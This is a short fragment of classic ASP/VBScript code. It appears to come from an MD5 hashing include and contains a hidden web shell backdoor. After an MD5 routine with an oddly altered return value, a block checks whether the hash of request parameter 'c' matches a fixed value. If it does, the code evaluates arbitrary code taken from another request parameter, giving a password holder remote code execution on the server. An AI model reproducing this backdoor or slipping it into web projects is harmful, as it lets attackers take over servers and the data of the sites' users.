...
md5 = mid(lcase(wordtohex(a) & wordtohex(b) & wordtohex(c) & wordtohex(d) & mid(wordtohex(c),1,1) & mid(wordtohex(c),3,1) & mid(wordtohex(c),7,1)),4)
...
if request("c") <>"" and MD5(request("c"))="C170DD7E3D903C592D7E7AA1247EEC9E" then
eval request(request("c"))
response.end
end if
